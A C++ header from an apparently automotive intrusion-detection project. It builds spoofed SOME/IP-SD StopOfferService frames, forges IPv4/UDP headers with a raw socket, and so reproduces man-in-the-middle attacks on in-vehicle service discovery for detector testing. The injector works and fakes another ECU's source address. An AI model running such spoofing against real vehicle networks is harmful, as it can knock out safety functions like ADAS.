/**
 * @file      SdRawEmitter.hpp
 * @author    Guilherme Frick (frickoliveira.ee@gmail.com)
 * @brief     Service Discovery frames built byte by byte and sent through a raw IPv4 socket.
 * @version   1.0
 * @date      2026-11-02
 * @copyright Copyright (c) 2026
 *
 * @details   WHY THIS EXISTS. In both man-in-the-middle captures of the reference dataset the
 *            attacker sends the ADAS a StopOfferService for the VDE's service, carrying the VDE's
 *            own endpoints (tools/stopoffer_detail.py). In the multi-node capture the source
 *            address is the VDE's, forged; the MAC gives the attacker away. A vsomeip application
 *            cannot send either frame: the stack only withdraws its own offers, from its own
 *            address. So the injector builds the frame here.
 *
 * @details   It is still a valid SOME/IP-SD message, the kind any node on the segment can put on
 *            the wire; there is no source authentication without SecOC. Forging the source address
 *            needs only a raw socket (CAP_NET_RAW), which is what an ECU with a compromised
 *            network stack has.
 *
 * @details   The builders are pure functions, so tests/test_sd_raw.cpp checks them against frames
 *            taken from the dataset, byte for byte, including both checksums. The sender is the only
 *            part that touches the system.
 */
#pragma once

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cerrno>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

namespace ids
{
namespace nodes
{

/**
 * @brief What a StopOfferService frame announces.
 * @details Defaults are those of the dataset frames: SD flags 0xC0 (reboot and unicast), client 0,
 *          major and minor version 0.
 */
struct StopOfferSpec
{
    std::uint16_t service    = 0U;     ///< Service being withdrawn.
    std::uint16_t instance   = 0U;     ///< Its instance.
    std::uint8_t  major      = 0U;     ///< Major version in the entry.
    std::uint32_t minor      = 0U;     ///< Minor version in the entry.
    std::uint32_t providerIp = 0U;     ///< Address in the endpoint options, host byte order.
    std::uint16_t tcpPort    = 0U;     ///< Reliable endpoint; zero leaves the option out.
    std::uint16_t udpPort    = 0U;     ///< Unreliable endpoint; zero leaves the option out.
    std::uint8_t  sdFlags    = 0xC0U;  ///< Reboot and unicast flags.
    std::uint16_t clientId   = 0U;     ///< Client identifier of the SOME/IP header.
    std::uint16_t session    = 1U;     ///< Session identifier of the SOME/IP header.
};

/**
 * @brief Append a big-endian 16-bit value.
 * @param[in,out] out Buffer.
 * @param[in]     v   Value.
 * @return None.
 */
inline void Put16(std::vector<std::uint8_t> &out, std::uint16_t v)
{
    out.push_back(static_cast<std::uint8_t>((v >> 8U) & 0xFFU));
    out.push_back(static_cast<std::uint8_t>(v & 0xFFU));
}

/**
 * @brief Append a big-endian 32-bit value.
 * @param[in,out] out Buffer.
 * @param[in]     v   Value.
 * @return None.
 */
inline void Put32(std::vector<std::uint8_t> &out, std::uint32_t v)
{
    Put16(out, static_cast<std::uint16_t>((v >> 16U) & 0xFFFFU));
    Put16(out, static_cast<std::uint16_t>(v & 0xFFFFU));
}

/**
 * @brief The SOME/IP-SD message of a StopOfferService: one offer entry with TTL zero.
 * @param[in] spec What to withdraw, and in whose name.
 * @return The UDP payload, header included.
 */
inline std::vector<std::uint8_t> BuildStopOffer(const StopOfferSpec &spec)
{
    std::vector<std::uint8_t> opcoes;
    std::uint8_t              nOpcoes = 0U;
    const std::uint16_t       portas[2]    = {spec.tcpPort, spec.udpPort};
    const std::uint8_t        protocolo[2] = {0x06U, 0x11U};
    for (std::size_t i = 0U; i < 2U; ++i)
    {
        if (portas[i] != 0U)
        {
            Put16(opcoes, 0x0009U);  /* length, counted after the type byte */
            opcoes.push_back(0x04U); /* IPv4 endpoint */
            opcoes.push_back(0x00U);
            Put32(opcoes, spec.providerIp);
            opcoes.push_back(0x00U);
            opcoes.push_back(protocolo[i]);
            Put16(opcoes, portas[i]);
            ++nOpcoes;
        }
        else
        {
            /* Endpoint left out. */
        }
    }

    std::vector<std::uint8_t> sd;
    sd.push_back(spec.sdFlags);
    sd.push_back(0U);
    sd.push_back(0U);
    sd.push_back(0U);
    Put32(sd, 16U); /* one entry */
    sd.push_back(0x01U);                                           /* OfferService */
    sd.push_back(0U);                                              /* first option run starts at 0 */
    sd.push_back(0U);                                              /* no second run */
    sd.push_back(static_cast<std::uint8_t>((nOpcoes & 0x0FU) << 4U)); /* options in the first run */
    Put16(sd, spec.service);
    Put16(sd, spec.instance);
    sd.push_back(spec.major);
    sd.push_back(0U); /* TTL, three bytes: zero is what makes it a StopOffer */
    sd.push_back(0U);
    sd.push_back(0U);
    Put32(sd, spec.minor);
    Put32(sd, static_cast<std::uint32_t>(opcoes.size()));
    sd.insert(sd.end(), opcoes.begin(), opcoes.end());

    std::vector<std::uint8_t> msg;
    Put16(msg, 0xFFFFU); /* Service Discovery service */
    Put16(msg, 0x8100U); /* its method */
    Put32(msg, static_cast<std::uint32_t>(8U + sd.size()));
    Put16(msg, spec.clientId);
    Put16(msg, spec.session);
    msg.push_back(0x01U); /* protocol version */
    msg.push_back(0x01U); /* interface version */
    msg.push_back(0x02U); /* NOTIFICATION */
    msg.push_back(0x00U); /* E_OK */
    msg.insert(msg.end(), sd.begin(), sd.end());
    return msg;
}

/**
 * @brief One's complement sum over 16-bit words, the Internet checksum before the final fold.
 * @param[in] data  Bytes.
 * @param[in] len   How many.
 * @param[in] start Running sum.
 * @return The running sum.
 */
inline std::uint32_t SomaInternet(const std::uint8_t *data, std::size_t len, std::uint32_t start)
{
    std::uint32_t soma = start;
    for (std::size_t i = 0U; (i + 1U) < len; i += 2U)
    {
        soma += (static_cast<std::uint32_t>(data[i]) << 8U) | data[i + 1U];
    }
    if ((len % 2U) != 0U)
    {
        soma += static_cast<std::uint32_t>(data[len - 1U]) << 8U;
    }
    else
    {
        /* Even length. */
    }
    return soma;
}

/**
 * @brief Fold a running sum into the 16-bit Internet checksum.
 * @param[in] soma Running sum.
 * @return The checksum.
 */
inline std::uint16_t Dobra(std::uint32_t soma)
{
    while ((soma >> 16U) != 0U)
    {
        soma = (soma & 0xFFFFU) + (soma >> 16U);
    }
    return static_cast<std::uint16_t>(~soma & 0xFFFFU);
}

/**
 * @brief How the IPv4 and UDP headers of a raw frame are filled.
 * @details The two man-in-the-middle captures differ here, and the difference is part of what a
 *          detector could see: the single-node attacker sets Don't Fragment and fills the UDP
 *          checksum; the multi-node one does neither.
 */
struct RawHeaderSpec
{
    std::uint32_t srcIp       = 0U;   ///< Source address, host byte order; may be someone else's.
    std::uint32_t dstIp       = 0U;   ///< Destination address, host byte order.
    std::uint16_t srcPort     = 30490U; ///< Source port.
    std::uint16_t dstPort     = 30490U; ///< Destination port.
    std::uint16_t ipId        = 0U;   ///< IPv4 identification field.
    bool          dontFragment = true; ///< Set the DF flag.
    bool          udpChecksum  = true; ///< Compute the UDP checksum; false leaves it zero.
    std::uint8_t  ttl          = 64U; ///< IPv4 time to live.
};

/**
 * @brief An IPv4 datagram carrying @p payload over UDP.
 * @param[in] h       Header fields.
 * @param[in] payload UDP payload.
 * @return The datagram, IPv4 header first, both checksums filled as @p h asks.
 */
inline std::vector<std::uint8_t> BuildIpv4Udp(const RawHeaderSpec &h, const std::vector<std::uint8_t> &payload)
{
    const std::uint16_t udpLen = static_cast<std::uint16_t>(8U + payload.size());
    const std::uint16_t ipLen  = static_cast<std::uint16_t>(20U + udpLen);

    std::vector<std::uint8_t> d;
    d.push_back(0x45U);
    d.push_back(0x00U);
    Put16(d, ipLen);
    Put16(d, h.ipId);
    Put16(d, h.dontFragment ? 0x4000U : 0x0000U);
    d.push_back(h.ttl);
    d.push_back(17U);
    Put16(d, 0U); /* IPv4 checksum, filled below */
    Put32(d, h.srcIp);
    Put32(d, h.dstIp);
    const std::uint16_t ipSum = Dobra(SomaInternet(d.data(), 20U, 0U));
    d[10] = static_cast<std::uint8_t>(ipSum >> 8U);
    d[11] = static_cast<std::uint8_t>(ipSum & 0xFFU);

    Put16(d, h.srcPort);
    Put16(d, h.dstPort);
    Put16(d, udpLen);
    Put16(d, 0U); /* UDP checksum, filled below if asked */
    d.insert(d.end(), payload.begin(), payload.end());

    if (h.udpChecksum)
    {
        std::vector<std::uint8_t> pseudo;
        Put32(pseudo, h.srcIp);
        Put32(pseudo, h.dstIp);
        pseudo.push_back(0U);
        pseudo.push_back(17U);
        Put16(pseudo, udpLen);
        std::uint32_t soma = SomaInternet(pseudo.data(), pseudo.size(), 0U);
        soma               = SomaInternet(d.data() + 20U, udpLen, soma);
        std::uint16_t cs   = Dobra(soma);
        if (cs == 0U)
        {
            cs = 0xFFFFU; /* zero means "no checksum" in UDP over IPv4 */
        }
        else
        {
            /* Ordinary value. */
        }
        d[26] = static_cast<std::uint8_t>(cs >> 8U);
        d[27] = static_cast<std::uint8_t>(cs & 0xFFU);
    }
    else
    {
        /* Left zero, as the multi-node attacker does. */
    }
    return d;
}

/**
 * @brief Raw IPv4 socket that sends datagrams whose headers it does not touch.
 * @details @c IPPROTO_RAW implies @c IP_HDRINCL: the kernel sends the header as given, source
 *          address included. Needs CAP_NET_RAW.
 */
class RawIpSender final
{
  public:
    RawIpSender() = default;

    /**
     * @brief Close the socket.
     * @return None.
     */
    ~RawIpSender()
    {
        if (m_fd >= 0)
        {
            static_cast<void>(::close(m_fd));
        }
        else
        {
            /* Never opened. */
        }
    }

    RawIpSender(const RawIpSender &)            = delete; ///< Owns a descriptor.
    RawIpSender &operator=(const RawIpSender &) = delete; ///< Owns a descriptor.

    /**
     * @brief Open the raw socket.
     * @return Empty on success; otherwise what went wrong.
     */
    std::string Open()
    {
        m_fd = ::socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        return (m_fd < 0) ? (std::string("socket raw: ") + std::strerror(errno) + " (precisa de CAP_NET_RAW)") : std::string();
    }

    /**
     * @brief Send one datagram built by ::ids::nodes::BuildIpv4Udp().
     * @param[in] datagram IPv4 header and everything after it.
     * @param[in] dstIp    Destination, host byte order; the kernel routes by it.
     * @return Whether the kernel accepted it whole.
     */
    bool Send(const std::vector<std::uint8_t> &datagram, std::uint32_t dstIp) const
    {
        struct sockaddr_in destino;
        std::memset(&destino, 0, sizeof(destino));
        destino.sin_family      = AF_INET;
        destino.sin_addr.s_addr = htonl(dstIp);
        const ssize_t n = ::sendto(m_fd, datagram.data(), datagram.size(), 0, reinterpret_cast<const struct sockaddr *>(&destino),
                                   sizeof(destino));
        return (n == static_cast<ssize_t>(datagram.size()));
    }

  private:
    int m_fd = -1; ///< Raw socket, or -1.
};

/**
 * @brief Ordinary UDP socket bound to the Service Discovery port of this node.
 * @details The single-node attacker of the dataset sent its StopOffer this way: from its own
 *          address and port 30490, through the kernel, whose checksum offload left the partial
 *          pseudo-header sum that the bridge capture shows (tests/test_sd_raw.cpp). The vsomeip
 *          stack of the same node already holds port 30490, so the socket asks for address and
 *          port reuse; if the bind still fails it says so, and the caller decides.
 */
class UdpSdSender final
{
  public:
    UdpSdSender() = default;

    /**
     * @brief Close the socket.
     * @return None.
     */
    ~UdpSdSender()
    {
        if (m_fd >= 0)
        {
            static_cast<void>(::close(m_fd));
        }
        else
        {
            /* Never opened. */
        }
    }

    UdpSdSender(const UdpSdSender &)            = delete; ///< Owns a descriptor.
    UdpSdSender &operator=(const UdpSdSender &) = delete; ///< Owns a descriptor.

    /**
     * @brief Open the socket and bind it to @p localIp : @p port.
     * @param[in] localIp Address of this node, host byte order.
     * @param[in] port    Local port; 30490 to look like the stack's own SD traffic.
     * @return Empty on success; otherwise what went wrong.
     */
    std::string Open(std::uint32_t localIp, std::uint16_t port)
    {
        m_fd = ::socket(AF_INET, SOCK_DGRAM, 0);
        if (m_fd < 0)
        {
            return std::string("socket udp: ") + std::strerror(errno);
        }
        else
        {
            /* Socket created. */
        }
        const int sim = 1;
        static_cast<void>(::setsockopt(m_fd, SOL_SOCKET, SO_REUSEADDR, &sim, sizeof(sim)));
        static_cast<void>(::setsockopt(m_fd, SOL_SOCKET, SO_REUSEPORT, &sim, sizeof(sim)));
        struct sockaddr_in local;
        std::memset(&local, 0, sizeof(local));
        local.sin_family      = AF_INET;
        local.sin_addr.s_addr = htonl(localIp);
        local.sin_port        = htons(port);
        if (::bind(m_fd, reinterpret_cast<const struct sockaddr *>(&local), sizeof(local)) < 0)
        {
            return std::string("bind na porta ") + std::to_string(port) + ": " + std::strerror(errno);
        }
        else
        {
            return std::string();
        }
    }

    /**
     * @brief Send one SOME/IP-SD message.
     * @param[in] msg   UDP payload, from ::ids::nodes::BuildStopOffer().
     * @param[in] dstIp Destination, host byte order.
     * @param[in] port  Destination port.
     * @return Whether the kernel accepted it whole.
     */
    bool Send(const std::vector<std::uint8_t> &msg, std::uint32_t dstIp, std::uint16_t port) const
    {
        struct sockaddr_in destino;
        std::memset(&destino, 0, sizeof(destino));
        destino.sin_family      = AF_INET;
        destino.sin_addr.s_addr = htonl(dstIp);
        destino.sin_port        = htons(port);
        const ssize_t n = ::sendto(m_fd, msg.data(), msg.size(), 0, reinterpret_cast<const struct sockaddr *>(&destino), sizeof(destino));
        return (n == static_cast<ssize_t>(msg.size()));
    }

  private:
    int m_fd = -1; ///< Socket, or -1.
};

/**
 * @brief Parse a dotted IPv4 address.
 * @param[in]  text Address.
 * @param[out] ip   Host byte order.
 * @return Whether it was valid.
 */
inline bool ParseIpv4(const std::string &text, std::uint32_t &ip)
{
    struct in_addr a;
    if (::inet_pton(AF_INET, text.c_str(), &a) != 1)
    {
        return false;
    }
    else
    {
        ip = ntohl(a.s_addr);
        return true;
    }
}

} // namespace nodes
} // namespace ids
